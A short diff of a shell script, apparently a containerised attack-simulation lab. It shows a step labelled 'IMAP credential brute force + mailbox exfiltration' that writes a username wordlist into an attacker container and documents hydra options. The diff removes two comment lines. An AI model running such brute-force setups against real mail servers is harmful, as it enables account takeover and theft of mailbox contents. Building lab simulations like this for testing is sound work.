@@ -87,7 +87,6 @@ docker exec "$ATTACKER_CONTAINER" \
 echo "--- IMAP credential brute force + mailbox exfiltration ---"
 
 # Build username wordlist - common first names, generic roles, and system accounts.
-# An attacker would derive these from VRFY results, LinkedIn, or web scraping.
 docker exec "$ATTACKER_CONTAINER" sh -c "cat > /tmp/imap_users.txt << 'WORDLIST'
 admin
 administrator
@@ -146,7 +145,6 @@ noreply
 WORDLIST"
 
 # Always write to a new file so old runs don't pollute the results.
-# hydra flags:
 # -L  -> Username wordlist
 # -P  -> Password wordlist
 # -s  -> Port
